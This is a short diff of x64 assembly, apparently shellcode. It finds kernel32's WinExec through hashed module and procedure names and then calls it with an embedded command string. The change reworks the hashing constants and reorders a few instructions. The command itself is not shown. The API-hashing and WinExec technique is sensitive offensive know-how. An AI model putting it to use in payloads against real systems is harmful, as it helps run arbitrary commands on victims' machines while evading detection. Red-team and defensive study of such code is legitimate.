@@ -14,21 +14,22 @@ entry:
 
   ; find "kernel32.dll, WinExec"
   cld                                   ; clear the direction flag
-  mov rcx, 0xCA2DBA870B222A04           ; set function hash
-  mov rdx, 0xB725F01C80CE0985           ; set hash key
+  mov rcx, 0x9BAC085EFA4FDFAE           ; set module name hash
+  mov rdx, 0x221840B185A6EC3D           ; set procedure name hash
+  mov r8,  0xCAF4D6F05577E596           ; set hash key
   call find_api                         ; try to find api address
   test rax, rax                         ; check target function is found
   jz not_found                          ;
 
   ; call "kernel32.dll, WinExec"
-  xor rdx, rdx                          ; clear rdx
   lea rcx, [rbx+command]                ; lpCmdLine
+  xor rdx, rdx                          ; clear rdx
   mov dl, [rbx+cmd_show]                ; uCmdShow
   sub rsp, 32                           ; reserve stack
   call rax                              ; call api function
   add rsp, 32                           ; restore stack
 
-  not_found:                            ;
+ not_found:
   ; restore context
   mov rsp, rbp                          ; restore stack
   pop rbp                               ; restore rbp
